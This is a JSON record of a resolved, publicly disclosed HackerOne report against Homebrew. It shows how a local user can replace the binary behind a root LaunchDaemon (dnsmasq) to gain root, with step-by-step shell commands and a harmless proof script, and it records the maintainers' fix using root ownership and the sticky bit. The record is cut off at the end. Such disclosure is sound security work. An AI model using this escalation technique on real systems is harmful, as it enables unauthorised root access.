@@ -1,0 +1,375 @@
+{
+    "id": 586251,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODYyNTE=",
+    "url": "https://hackerone.com/reports/586251",
+    "title": "Homebrew installed LaunchDaemons create simple root esclations",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "high",
+    "readable_substate": "Resolved",
+    "created_at": "2019-05-20T19:34:49.683Z",
+    "submitted_at": "2019-05-20T19:34:49.683Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "keeleysam",
+        "url": "/keeleysam",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 19399,
+        "url": "https://hackerone.com/homebrew",
+        "handle": "homebrew",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/000/019/399/2f26b1d3c096d89ed989900225c128f670ab0ef0_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "paused",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": false,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "Homebrew",
+            "twitter_handle": "MacHomebrew",
+            "website": "https://brew.sh",
+            "about": "The missing package manager for macOS (and Linux)"
+        }
+    },
+    "has_bounty?": false,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": false,
+    "disclosed_at": "2019-05-24T16:36:52.595Z",
+    "bug_reporter_agreed_on_going_public_at": "2019-05-24T16:36:52.534Z",
+    "team_member_agreed_on_going_public_at": "2019-05-24T16:14:38.648Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Many programs installed via Homebrew require services to function as expected - most of the time these are LaunchAgents but sometimes they need to run as root via LaunchDaemons to function properly.  While Homebrew attempts to secure the executables run by the LaunchDaemons that it installs, any other program running as the user can easily swap out the program for a simple root escalation.\n\nReproduction steps:\n- In this case, we'll be looking at dnsmasq, but there are many others \n\n1. Install macOS Mojave 10.14.5, create an account and login.\n2. Install homebrew with the instructions on brew.sh.\n3. Run `brew install dnsmasq` - brew will tell the user to run `sudo brew services start dnsmasq`\n4. Run `sudo brew services start dnsmasq` as prompted.\n\n```\nsamuels-Mac:~ samuel$ sudo brew services start dnsmasq\nPassword:\n==> Tapping homebrew/services\nCloning into '/usr/local/Homebrew/Library/Taps/homebrew/homebrew-services'...\nremote: Enumerating objects: 17, done.\nremote: Counting objects: 100% (17/17), done.\nremote: Compressing objects: 100% (14/14), done.\nremote: Total 17 (delta 0), reused 12 (delta 0), pack-reused 0\nUnpacking objects: 100% (17/17), done.\nTapped 1 command (50 files, 62.6KB).\n==> Successfully started `dnsmasq` (label: homebrew.mxcl.dnsmasq)\n```\n5. We'll find a new LaunchDaemon has been created:\n\n```\nsamuels-Mac:~ samuel$ cat /Library/LaunchDaemons/homebrew.mxcl.dnsmasq.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n  <dict>\n    <key>Label</key>\n    <string>homebrew.mxcl.dnsmasq</string>\n    <key>ProgramArguments</key>\n    <array>\n      <string>/usr/local/opt/dnsmasq/sbin/dnsmasq</string>\n      <string>--keep-in-foreground</string>\n      <string>-C</string>\n      <string>/usr/local/etc/dnsmasq.conf</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n    <key>KeepAlive</key>\n    <true/>\n  </dict>\n</plist>\n```\n\n6. If we look at the folder `/usr/local/opt/dnsmasq/sbin` we can see that our user doesn't have write permissions on the `/usr/local/opt/dnsmasq/sbin/dnsmasq` program which the LaunchDaemon runs.  \n\n```\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin\ntotal 560\ndrwxr-xr-x   3 samuel  staff    96B Oct 18  2018 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq\nsamuels-Mac:~ samuel$ echo \"\" >> /usr/local/opt/dnsmasq/sbin/dnsmasq \n-bash: /usr/local/opt/dnsmasq/sbin/dnsmasq: Permission denied\n```\n\n7. However, because our user _does_ have write permissions on the `/usr/local/opt/dnsmasq/sbin` directory, an attacker can move `/usr/local/opt/dnsmasq/sbin/dnsmasq` to the side and replace it with a different executable:\n\n```\nsamuels-Mac:~ samuel$ cat /tmp/evil.sh \n#!/bin/sh\n\ntouch /Library/evil\n\nexit 0\n\nsamuels-Mac:~ samuel$ ls -lah /tmp/evil.sh \n-rwxr-xr-x  1 samuel  wheel    40B May 20 12:30 /tmp/evil.sh\nsamuels-Mac:~ samuel$ mv /usr/local/opt/dnsmasq/sbin/dnsmasq /usr/local/opt/dnsmasq/sbin/dnsmasq.bak\nsamuels-Mac:~ samuel$ mv /tmp/evil.sh /usr/local/opt/dnsmasq/sbin/dnsmasq\nsamuels-Mac:~ samuel$ ls -lah /usr/local/opt/dnsmasq/sbin/\ntotal 568\ndrwxr-xr-x   4 samuel  staff   128B May 20 12:31 .\ndrwxr-xr-x  10 samuel  staff   320B May 20 12:24 ..\n-rwxr-xr-x   1 samuel  wheel    40B May 20 12:30 dnsmasq\n-r-xr-xr-x   1 samuel  staff   279K Oct 18  2018 dnsmasq.bak\nsamuels-Mac:~ samuel$ ls -lah /Library/evil\nls: /Library/evil: No such file or directory\n```\n\n8. Once the service relaunches for any reason (reboot of the Mac is most likely), root will execute the malicious executable.\n\n```\nsamuels-Mac:~ samuel$ ls -lah /Library/evil \n-rw-r--r--  1 root  wheel     0B May 20 12:34 /Library/evil\n```\n\n## Impact\n\nAny homebrew formula which prompts users to run `sudo brew services start` opens up this vulnerability.  \n\nOnce this is opened up, any attacker who can run code as the user can easily escalate to root.",
+    "weakness": {
+        "id": 75,
+        "name": "Privilege Escalation"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [],
+    "allow_singular_disclosure_at": "2019-06-23T16:14:38.736Z",
+    "allow_singular_disclosure_after": -131987909.04262216,
+    "singular_disclosure_allowed": true,
+    "vote_count": 8,
+    "voters": [
+        "foobar7",
+        "htrgouvea",
+        "imran_nisar",
+        "mobius07",
+        "pateljayk",
+        "cryptographer",
+        "hi_ztz",
+        "nexxius"
+    ],
+    "severity": {
+        "rating": "high",
+        "author_type": "User"
+    },
+    "structured_scope": null,
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 4886992,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I don't see this as being particularly Homebrew-specific as it could apply to any plist for binaries running in user-writable locations. How would you see this being mitigated? Thanks!",
+            "automated_response": false,
+            "created_at": "2019-05-20T20:34:58.936Z",
+            "updated_at": "2019-05-20T20:34:58.936Z",
+            "actor": {
+                "username": "mikemcquaid",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikemcquaid",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LG6RZDL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJdTZfeKApP2QS7QGiB0WEdU4pYq%2FsRbpdwPy2QyNAeAiEAmgtLgdwqFXMBVHr7gfKhZwYKoScAzlOtnFSHF25tz%2FUquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOF9JtZ4gkfpfs%2BDSyqPBeDmRTGOk%2FQ0Lp4UDtYHCYRdXC3RScdKv49e48LePEUQFXzscb2IHgIHyRGNZoAUqXYVhAUbTajcOPmHcZ93%2FOeX9JmoWmtzA24A2Hq74bOzGyNbUiV5V0PnMAyxfHC%2Br%2FN5nLc%2BrKOa1iur3rZuolDaW2qQae4zTcR3h47ugYPBwueCw0%2BOwpJwXIS%2BGBe8Y5F5E6J3E95sXR1FwTk%2F3o3uIwry60pn4YOrV4QMv%2BU%2FEQkgTGeFl%2FGOmAPKV9FEDXIzD5ctWPRMSDRGMHlMsvFRQkHdbAHzCBDsMt63iPa2gEzAIXjQo9Okb53zq3hhq8rDrKIOjCHNM84Kj2lz%2BPW4zyhbGJUlkG7Hys5go92k7P469aY%2F%2FRwJenDUbrAe1qz2OWKVLrrWxNfaBDjogaQO3sj4usfn1yOuDpmEoPnvjSdgsF3C69t7QLqopNArierFJkQ6C4e0P8l0e5xVmJhsKXvDGoEe1n3mMkTFubO6yCQaRW%2BIT6ld%2Btnv02IgwbxWh3Ycyu6ykGuvGpAe2NRP8jjunjuupvvkfgU0wIMQ%2FGW9sk7LZC0l%2FcxtxdFUB7tyNgRXsKFMao8Zd8oefA4g8pB2uRU%2B69%2Fq46h3aTIUpetFDYBd3TkVrK492zxQ3uogGwX7osKLzU5nxch7eG%2B507P8wTK7KWrQKIM6tTKvc3M%2BTLPvEUU7cYQJ3qyhU5lqDhH9I5qW5OaZo54eJJIFvbEoqk3C4LHxDmDrhJLhktAdD1A8bt4uGwkAxrPv6E7e1%2FSfPwOca05sA9Z6wendh89z1R5rtTDMaxV9%2FUxY0wmjd3NeqjN1XwZnJbQhCGGvfJ6E%2BqwvMd0APQc3Z%2FlWR2dqTc5FrkmCQui4IA4w9Zi2pwY6sQE7wRj1Oxg0O8u8POt7PWf8qRtqLFUvU0cLSS8IMZ5a9SYmyVvhbg5r3BwIvqmz2BgNOR%2B11zEEaur7aC64OW1EKG2unPxmYrlpvv%2FCy9GR3IVoMLibd5H3WUvuYXqG%2FPEKyB3eksXE0Eaz6H5kncua8L1Zrqa7oAlcN7T1dY%2F22nfPExln5a%2FCdZHrRkAzxGsqqgRGKV1qY4%2F6jqdnZRQPEFgdD2zWD1G5xqCRcryq1Og%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907040985d9e80e0a178a646a062b9c6448aebcd376a8fafdb87a6eb8a3d9f0c"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4887848,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "It is true that this isn't really homebrew specific, and that the real fix here would be for launchd to not run anything which is user writable, but barring any changes on that side this is a hole that homebrew is opening up.\n\nTo mitigate, when Homebrew sets up a LaunchDaemon like this, it should ensure that what it points at is not mutable by the user without authentication.  This should probably be by ensuring that the directory is owned by root:wheel instead of user:staff, in this example `/usr/local/opt/dnsmasq/sbin`.  This would mean that updates to executable require authentication, but this is how it really should be.\n\nOtherwise, any of these homebrew LaunchDaemons are just places where arbitrary code can get run as root with very little effort.",
+            "automated_response": false,
+            "created_at": "2019-05-20T21:55:20.609Z",
+            "updated_at": "2019-05-20T21:55:20.609Z",
+            "actor": {
+                "username": "keeleysam",
+                "cleared": false,
+                "verified": false,
+                "url": "/keeleysam",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4888206,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Also I would presume that you already need to elevate permissions to unload and reload the launchdaemon for updates, so doing that to update the executable in the directory it is run from shouldn't be a compromise to user experience.",
+            "automated_response": false,
+            "created_at": "2019-05-20T22:18:30.610Z",
+            "updated_at": "2019-05-20T22:18:30.610Z",
+            "actor": {
+                "username": "keeleysam",
+                "cleared": false,
+                "verified": false,
+                "url": "/keeleysam",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4895310,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Just to keep you in the loop: there's ongoing discussion with the Homebrew maintainers on how best to mitigate this (or at least better inform users of the risks). ",
+            "automated_response": false,
+            "created_at": "2019-05-21T16:22:12.199Z",
+            "updated_at": "2019-05-21T16:22:12.199Z",
+            "actor": {
+                "username": "mikemcquaid",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikemcquaid",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LG6RZDL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJdTZfeKApP2QS7QGiB0WEdU4pYq%2FsRbpdwPy2QyNAeAiEAmgtLgdwqFXMBVHr7gfKhZwYKoScAzlOtnFSHF25tz%2FUquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOF9JtZ4gkfpfs%2BDSyqPBeDmRTGOk%2FQ0Lp4UDtYHCYRdXC3RScdKv49e48LePEUQFXzscb2IHgIHyRGNZoAUqXYVhAUbTajcOPmHcZ93%2FOeX9JmoWmtzA24A2Hq74bOzGyNbUiV5V0PnMAyxfHC%2Br%2FN5nLc%2BrKOa1iur3rZuolDaW2qQae4zTcR3h47ugYPBwueCw0%2BOwpJwXIS%2BGBe8Y5F5E6J3E95sXR1FwTk%2F3o3uIwry60pn4YOrV4QMv%2BU%2FEQkgTGeFl%2FGOmAPKV9FEDXIzD5ctWPRMSDRGMHlMsvFRQkHdbAHzCBDsMt63iPa2gEzAIXjQo9Okb53zq3hhq8rDrKIOjCHNM84Kj2lz%2BPW4zyhbGJUlkG7Hys5go92k7P469aY%2F%2FRwJenDUbrAe1qz2OWKVLrrWxNfaBDjogaQO3sj4usfn1yOuDpmEoPnvjSdgsF3C69t7QLqopNArierFJkQ6C4e0P8l0e5xVmJhsKXvDGoEe1n3mMkTFubO6yCQaRW%2BIT6ld%2Btnv02IgwbxWh3Ycyu6ykGuvGpAe2NRP8jjunjuupvvkfgU0wIMQ%2FGW9sk7LZC0l%2FcxtxdFUB7tyNgRXsKFMao8Zd8oefA4g8pB2uRU%2B69%2Fq46h3aTIUpetFDYBd3TkVrK492zxQ3uogGwX7osKLzU5nxch7eG%2B507P8wTK7KWrQKIM6tTKvc3M%2BTLPvEUU7cYQJ3qyhU5lqDhH9I5qW5OaZo54eJJIFvbEoqk3C4LHxDmDrhJLhktAdD1A8bt4uGwkAxrPv6E7e1%2FSfPwOca05sA9Z6wendh89z1R5rtTDMaxV9%2FUxY0wmjd3NeqjN1XwZnJbQhCGGvfJ6E%2BqwvMd0APQc3Z%2FlWR2dqTc5FrkmCQui4IA4w9Zi2pwY6sQE7wRj1Oxg0O8u8POt7PWf8qRtqLFUvU0cLSS8IMZ5a9SYmyVvhbg5r3BwIvqmz2BgNOR%2B11zEEaur7aC64OW1EKG2unPxmYrlpvv%2FCy9GR3IVoMLibd5H3WUvuYXqG%2FPEKyB3eksXE0Eaz6H5kncua8L1Zrqa7oAlcN7T1dY%2F22nfPExln5a%2FCdZHrRkAzxGsqqgRGKV1qY4%2F6jqdnZRQPEFgdD2zWD1G5xqCRcryq1Og%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907040985d9e80e0a178a646a062b9c6448aebcd376a8fafdb87a6eb8a3d9f0c"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4911334,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I've got a proof of concept up here: https://github.com/Homebrew/homebrew-services/compare/master...MikeMcQuaid:root-ownership\n\nThis will take ownership of the binary and `bin` or `sbin` directory and set the sticky bit on both. In my testing this prevents the replacement of these files.\n\nIf you consider this to resolve the issue I'll close and disclose.\n\nThanks again!",
+            "automated_response": false,
+            "created_at": "2019-05-23T16:32:23.082Z",
+            "updated_at": "2019-05-23T16:32:23.082Z",
+            "actor": {
+                "username": "mikemcquaid",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikemcquaid",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LG6RZDL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJdTZfeKApP2QS7QGiB0WEdU4pYq%2FsRbpdwPy2QyNAeAiEAmgtLgdwqFXMBVHr7gfKhZwYKoScAzlOtnFSHF25tz%2FUquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOF9JtZ4gkfpfs%2BDSyqPBeDmRTGOk%2FQ0Lp4UDtYHCYRdXC3RScdKv49e48LePEUQFXzscb2IHgIHyRGNZoAUqXYVhAUbTajcOPmHcZ93%2FOeX9JmoWmtzA24A2Hq74bOzGyNbUiV5V0PnMAyxfHC%2Br%2FN5nLc%2BrKOa1iur3rZuolDaW2qQae4zTcR3h47ugYPBwueCw0%2BOwpJwXIS%2BGBe8Y5F5E6J3E95sXR1FwTk%2F3o3uIwry60pn4YOrV4QMv%2BU%2FEQkgTGeFl%2FGOmAPKV9FEDXIzD5ctWPRMSDRGMHlMsvFRQkHdbAHzCBDsMt63iPa2gEzAIXjQo9Okb53zq3hhq8rDrKIOjCHNM84Kj2lz%2BPW4zyhbGJUlkG7Hys5go92k7P469aY%2F%2FRwJenDUbrAe1qz2OWKVLrrWxNfaBDjogaQO3sj4usfn1yOuDpmEoPnvjSdgsF3C69t7QLqopNArierFJkQ6C4e0P8l0e5xVmJhsKXvDGoEe1n3mMkTFubO6yCQaRW%2BIT6ld%2Btnv02IgwbxWh3Ycyu6ykGuvGpAe2NRP8jjunjuupvvkfgU0wIMQ%2FGW9sk7LZC0l%2FcxtxdFUB7tyNgRXsKFMao8Zd8oefA4g8pB2uRU%2B69%2Fq46h3aTIUpetFDYBd3TkVrK492zxQ3uogGwX7osKLzU5nxch7eG%2B507P8wTK7KWrQKIM6tTKvc3M%2BTLPvEUU7cYQJ3qyhU5lqDhH9I5qW5OaZo54eJJIFvbEoqk3C4LHxDmDrhJLhktAdD1A8bt4uGwkAxrPv6E7e1%2FSfPwOca05sA9Z6wendh89z1R5rtTDMaxV9%2FUxY0wmjd3NeqjN1XwZnJbQhCGGvfJ6E%2BqwvMd0APQc3Z%2FlWR2dqTc5FrkmCQui4IA4w9Zi2pwY6sQE7wRj1Oxg0O8u8POt7PWf8qRtqLFUvU0cLSS8IMZ5a9SYmyVvhbg5r3BwIvqmz2BgNOR%2B11zEEaur7aC64OW1EKG2unPxmYrlpvv%2FCy9GR3IVoMLibd5H3WUvuYXqG%2FPEKyB3eksXE0Eaz6H5kncua8L1Zrqa7oAlcN7T1dY%2F22nfPExln5a%2FCdZHrRkAzxGsqqgRGKV1qY4%2F6jqdnZRQPEFgdD2zWD1G5xqCRcryq1Og%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907040985d9e80e0a178a646a062b9c6448aebcd376a8fafdb87a6eb8a3d9f0c"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4911866,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "This looks reasonable to me - this is a nifty use of the sticky bit.\n\nSam",
+            "automated_response": false,
+            "created_at": "2019-05-23T17:59:35.680Z",
+            "updated_at": "2019-05-23T17:59:35.680Z",
+            "actor": {
+                "username": "keeleysam",
+                "cleared": false,
+                "verified": false,
+                "url": "/keeleysam",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/000/188/238/47eb015f939168abe8a35220069d0d36f4f798b0_original.jpeg/fd3465a1d18de709ef6a7a4daaffea9f69b778e9708be2cc15159c7bef911a89"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4918503,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2019-05-24T16:14:02.754Z",
+            "updated_at": "2019-05-24T16:14:02.754Z",
+            "actor": {
+                "username": "mikemcquaid",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikemcquaid",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LG6RZDL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJdTZfeKApP2QS7QGiB0WEdU4pYq%2FsRbpdwPy2QyNAeAiEAmgtLgdwqFXMBVHr7gfKhZwYKoScAzlOtnFSHF25tz%2FUquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOF9JtZ4gkfpfs%2BDSyqPBeDmRTGOk%2FQ0Lp4UDtYHCYRdXC3RScdKv49e48LePEUQFXzscb2IHgIHyRGNZoAUqXYVhAUbTajcOPmHcZ93%2FOeX9JmoWmtzA24A2Hq74bOzGyNbUiV5V0PnMAyxfHC%2Br%2FN5nLc%2BrKOa1iur3rZuolDaW2qQae4zTcR3h47ugYPBwueCw0%2BOwpJwXIS%2BGBe8Y5F5E6J3E95sXR1FwTk%2F3o3uIwry60pn4YOrV4QMv%2BU%2FEQkgTGeFl%2FGOmAPKV9FEDXIzD5ctWPRMSDRGMHlMsvFRQkHdbAHzCBDsMt63iPa2gEzAIXjQo9Okb53zq3hhq8rDrKIOjCHNM84Kj2lz%2BPW4zyhbGJUlkG7Hys5go92k7P469aY%2F%2FRwJenDUbrAe1qz2OWKVLrrWxNfaBDjogaQO3sj4usfn1yOuDpmEoPnvjSdgsF3C69t7QLqopNArierFJkQ6C4e0P8l0e5xVmJhsKXvDGoEe1n3mMkTFubO6yCQaRW%2BIT6ld%2Btnv02IgwbxWh3Ycyu6ykGuvGpAe2NRP8jjunjuupvvkfgU0wIMQ%2FGW9sk7LZC0l%2FcxtxdFUB7tyNgRXsKFMao8Zd8oefA4g8pB2uRU%2B69%2Fq46h3aTIUpetFDYBd3TkVrK492zxQ3uogGwX7osKLzU5nxch7eG%2B507P8wTK7KWrQKIM6tTKvc3M%2BTLPvEUU7cYQJ3qyhU5lqDhH9I5qW5OaZo54eJJIFvbEoqk3C4LHxDmDrhJLhktAdD1A8bt4uGwkAxrPv6E7e1%2FSfPwOca05sA9Z6wendh89z1R5rtTDMaxV9%2FUxY0wmjd3NeqjN1XwZnJbQhCGGvfJ6E%2BqwvMd0APQc3Z%2FlWR2dqTc5FrkmCQui4IA4w9Zi2pwY6sQE7wRj1Oxg0O8u8POt7PWf8qRtqLFUvU0cLSS8IMZ5a9SYmyVvhbg5r3BwIvqmz2BgNOR%2B11zEEaur7aC64OW1EKG2unPxmYrlpvv%2FCy9GR3IVoMLibd5H3WUvuYXqG%2FPEKyB3eksXE0Eaz6H5kncua8L1Zrqa7oAlcN7T1dY%2F22nfPExln5a%2FCdZHrRkAzxGsqqgRGKV1qY4%2F6jqdnZRQPEFgdD2zWD1G5xqCRcryq1Og%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=907040985d9e80e0a178a646a062b9c6448aebcd376a8fafdb87a6eb8a3d9f0c"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "keeleysam",
+                "url": "/keeleysam"
+            },
+            "genius_execution_id": null,
+            "team_handle": "homebrew"
+        },
+        {
+            "id": 4918504,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Great work, thanks again!",
+            "automated_response": false,
+            "created_at": "2019-05-24T16:14:31.136Z",
+            "updated_at": "2019-05-24T16:14:31.136Z",
+            "actor": {
+                "username": "mikemcquaid",
+                "cleared": false,
+                "verified": false,
+                "url": "/mikemcquaid",
+                "profile_picture_urls": {
+                    "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/rwqfvd8y58p42weq9cq5q3j52jij/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc?response-content-disposition=inline%3B%20filename%3D%22Me.jpg%22%3B%20filename%2A%3DUTF-8%27%27Me.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ3LG6RZDL%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T073307Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIEJdTZfeKApP2QS7QGiB0WEdU4pYq%2FsRbpdwPy2QyNAeAiEAmgtLgdwqFXMBVHr7gfKhZwYKoScAzlOtnFSHF25tz%2FUquwUIn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDOF9JtZ4gkfpfs%2BDSyqPBeDmRTGOk%2FQ0Lp4UDtYHCYRdXC3RScdKv49e48LePEUQFXzscb2IHgIHyRGNZoAUqXYVhAUbTajcOPmHcZ93%2FOeX9JmoWmtzA24A2Hq74bOzGyNbUiV5V0PnMAyxfHC%2Br%2FN5nLc%2BrKOa1iur3rZuolDaW2qQae4zTcR3h47ugYPBwueCw0%2BOwpJwXIS%2BGBe8Y5F5E6J3E95sXR1FwTk%2F3o3uIwry60pn4YOrV4QMv%2BU%2FEQkgTGeFl%2FGOmAPKV9FEDXIzD5ctWPRMSDRGMHlMsvFRQkHdbAHzCBDsMt63iPa2gEzAIXjQo9Okb53zq3hhq8rDrKIOjCHNM84Kj2lz%2BPW4zyhbGJUlkG7Hys5go92k7P469aY%2F%2FRwJenDUbrAe1qz2OWKVLrrWxNfaBDjogaQO3sj4usfn1yOuDpmEoPnvjSdgsF3C69t7QLqopNArierFJkQ6C4e0P8l0e5xVmJhsKXvDGoEe1n3mMkTFubO6yCQaRW%2BIT6ld%2Btnv02IgwbxW